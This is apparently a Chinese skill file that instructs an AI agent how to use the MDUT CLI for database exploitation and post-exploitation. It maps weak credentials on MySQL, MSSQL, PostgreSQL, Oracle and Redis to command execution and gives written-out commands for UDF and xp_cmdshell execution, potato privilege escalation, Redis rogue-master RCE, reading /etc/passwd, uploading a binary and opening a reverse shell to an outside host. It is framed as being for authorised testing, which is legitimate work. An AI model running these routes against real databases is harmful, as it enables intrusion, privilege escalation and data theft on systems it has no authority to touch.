---
name: pentest-mdut
description: MDUT CLI（Multiple Database Utilization Tools，数据库利用与后渗透）操作手册：task 隔离、命令词汇、退出码、大文件纪律、清痕义务与代理。
whenToUse: 涉及数据库弱口令利用（MySQL/MSSQL/PostgreSQL/Oracle/Redis/MongoDB）、UDF/CLR/Java Source 命令执行、数据库侧文件读写、反弹 Shell 的授权测试任务时加载。
priority: high
alwaysApply: false
---

# MDUT CLI 工具手册（草稿）

> ⚠️ 本手册随 CLI 实施迭代：命令词汇以 M0 冻结的 `docs/3.CLI命令面规格.md` 为准，参数以 `mdut --help`、`mdut help <command>` 实时输出为准——**skill 不复制参数级文档**，上游升级自动跟上。
> 仅限授权安全测试使用。

## 何时用 / 怎么想

- 拿到数据库凭据（弱口令/注入拖库/配置文件提取）后，用 `add` 登记进某个 task，由 CLI 统一接管命令执行/文件/反弹操作。
- 选路速查：MySQL 弱口令 → `info` 看版本/平台/UDF 可写性 → `exec`（UDF 部署后传 shell 命令原文，CLI 自动包 `sys_eval`，**不要自己写 SELECT sys_eval**）；MSSQL sa → `exec --method xpcmdshell`（失败按 oap/agent/clr/potato 系递进）；PostgreSQL → `info` 看 low/udf/cve 分档自动选路；Oracle DBA → `--method java`（无 DBA 试 scheduler）；Redis 未授权 → `crontab/sshkey` 免 rogue，主从 RCE 需先起外部 rogue（`--vps-host/--vps-port`，配 MSF 预编译 exp.so，勿用高版本 gcc 自编译——redis 4.0.14 会崩）。
- 一个任务（engagement）= 一个 `--task` 名 = 一个隔离 data.db；**临时/人工调试可省略 `--task`（落 `default`），正式任务必须显式命名**；connection_id 仅 task 内有效，跨任务同号是不同连接。

## 语法与约定

```bash
mdut [--task NAME] [--format json|text] [--timeout SEC] [--proxy socks5://[user:pass@]h:p] <command> [--flags]
```

- stdout **恰好一行 JSON**：成功 `{"ok":true,"task":...,"tool":...,"text"/业务字段,"id":...}`；失败 `{"ok":false,"error":...,"hint":...}`。日志全部走 stderr。
- **退出码**：`0` 成功 / `2` 用法错误 / `3` 目标连接或执行失败 / `4` 超时 / `5` task 写锁竞争。
- 默认超时 5s（连接级）/命令级 `--timeout` 放宽；`--proxy` 让 CLI 经既有 SOCKS5 通道连目标（不支持出站枢轴——内网穿透用既有隧道工具先行转发，再 `--proxy` 或直连 127.0.0.1）。
- 首次使用某 task：wrapper 自动建 `tasks/<task>/`（data.db 首用即建）；`mdut doctor` 可自检环境（java/驱动/Plugins/代理连通）。

## 常用命令（L2 高频；完整清单 `mdut --help`）

```bash
mdut --task T add mysql --host 10.0.0.1 --port 3306 --user root --pass '123456' --db mysql --memo target   # → 信封含 "id"
mdut --task T list [--group G]
mdut --task T info --id 3                                    # 版本/平台/利用条件（redis 附带 CVE 扫描）
mdut --task T exec --id 3 'id'                               # mysql：UDF 后传 shell 命令原文
mdut --task T exec --id 3 --method xpcmdshell 'whoami'       # mssql；potato 系：--method badpotato|godpotato|efspotato|sweetpotato
mdut --task T --sql --id 3 "select LOAD_FILE('/flag')"       # 原生 SQL（mysql/mssql）
mdut --task T list-files --id 3 /var/www                     # 文件发现（各库路线见 help）
mdut --task T download --id 3 /etc/passwd --out ./passwd     # 大文件直存本地
mdut --task T upload --id 5 ./tool.elf /tmp/tool.elf
mdut --task T revshell --id 3 10.0.0.99 4444
mdut --task T exec --id 6 --vps-host 10.0.0.99 --vps-port 21000 'id'   # redis 主从 RCE（先起 rogue）
mdut --task T clean --id 3                                   # 清痕（部署了什么卸什么；mssql recovery 一键恢复组件）
mdut --task T delete 3
```

## 长尾能力（不进 skill 正文）

非高频操作（mongodb info、redis crontab/lua/sshkey/rdb、oracle --oracle-service、--format text、task list/path 等）：

1. `mdut --help` 查命令清单；2. `mdut help <command>` 看参数/必填/别名；3. 按输出信封 `hint` 修正调用。

## 纪律（违反即返工）

1. **大文件**：`download --out` / `upload` 直存直传，禁止把文件内容读进上下文；JSON 内嵌 base64 仅限小内容。
2. **清痕义务**：提权组件（UDF/CLR/potato/Java Source/Redis Module）用完必须 `clean`（mssql 必要时 `recovery`），并在任务记录留痕。
3. **审计**：每条命令自动落账 `<task>/logs/audit.jsonl`；多 agent 协作回溯靠它，禁止绕过。
4. **task 卫生**：禁止把凭据写进 skill/文档；正式任务显式 `--task`；任务结束清理 task 目录。
5. **编码**：目标回显乱码时用 `-c`（MSSQL 直连缺省 GB2312 是现网兼容行为），勿盲目硬试。
6. **rogue 外置**：redis 主从的伪主库是外部进程（bash 起 rogue 脚本），CLI 不内置不等待；`--vps-host/--vps-port` 指向它。

## 实验室验收

见仓库 `AGENTS.md` §4.1（TC1 本机 Redis / TC2 本机 PostgreSQL / TC3 MySQL+UDF 全链 / TC4 SOCKS5 入站代理，含负控制与清痕查证）。仅限授权实验室执行。
